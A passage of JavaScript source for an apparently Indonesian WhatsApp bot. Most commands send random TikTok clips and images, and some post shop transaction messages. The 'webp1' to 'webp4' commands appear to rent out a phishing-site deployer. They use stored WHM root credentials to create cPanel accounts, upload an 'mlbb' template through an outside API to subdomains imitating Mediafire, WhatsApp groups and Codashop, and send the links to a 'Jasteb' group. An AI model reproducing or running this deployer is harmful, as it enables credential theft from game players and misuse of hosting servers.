Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var bocil = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var ukhty = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var santuy = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var kayes = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var rikagusriani = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break      
case 'done':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal`);
let barang = t[0];
let nominal = t[1];
reply(`*━━ TRANSAKSI INFO ━━*

 _• *Barang:* ${barang}_
 _• *Nominal:* ${nominal}_
 _• *Tanggal:* Rp${tanggal}_

*TERIMA KASIH TELAH ORDER DI ${global.namaCreator}*\n*JANGAN LUPA ORDER LAGI YA*🙏`)
}
        break
case "tunda": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚* )▭▬▭


𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚
𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥

 Powered By *@${hardznum.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, hardznum], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "proses": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *𝗦𝗘𝗗𝗔𝗡𝗚 𝗗𝗜 𝗣𝗥𝗢𝗦𝗘𝗦* )▭▬▭


𝗛𝗮𝗿𝗮𝗽 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗯𝗲𝗻𝘁𝗮𝗿
𝗣𝗿𝗼𝗱𝘂𝗸 𝗦𝗲𝗱𝗮𝗻𝗴 𝗗𝗶 𝗣𝗿𝗼𝘀𝗲𝘀️

 Powered By *@${hardznum.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, hardznum], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "batal": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗔𝗧𝗔𝗟* )▭▬▭

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${jam}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹

 Powered By *@${hardznum.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, hardznum], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "reqvps": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *REQUEST VPS* )▭▬▭

Region : 
Os : 
Version : 
Ram : 
Ip : 
Password : 
*Garansi 15 Day*
*Create ${tanggal}*
*Hari Ini ${hariini}*

⸼  ࣪ ׅ ︶︶︶  𖣇𖢅𖣇  ︶︶︶ ⸼  ࣪ ׅ
 Powered By *@${hardznum.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, hardznum], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case 'webp1' :
id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mediafirel" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("_*PROSES DECK JEDA 2-3 MENIT*_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiinew.newnesia.biz.id/web/fire/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiinew.newnesia.biz.id/web/fire/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                    hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/HvC8kvi2argANFrfCnpNPH
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`Hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break
case 'webp2' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "medafire2" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("_*PROSES DECK JEDA 2-3 MENIT*_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiinew.newnesia.biz.id/web/fire2/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiinew.newnesia.biz.id/web/fire2/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/HvC8kvi2argANFrfCnpNPH
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'webp3' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "grupwa" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("_*PROSES DECK JEDA 2-3 MENIT*_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiinew.newnesia.biz.id/web/wa/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiinew.newnesia.biz.id/web/wa/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/HvC8kvi2argANFrfCnpNPH
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'webp4' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "codashop" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.chat.participant
        reply("_*PROSES DECK JEDA 2-3 MENIT*_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiinew.newnesia.biz.id/web/cod/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiinew.newnesia.biz.id/web/cod/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
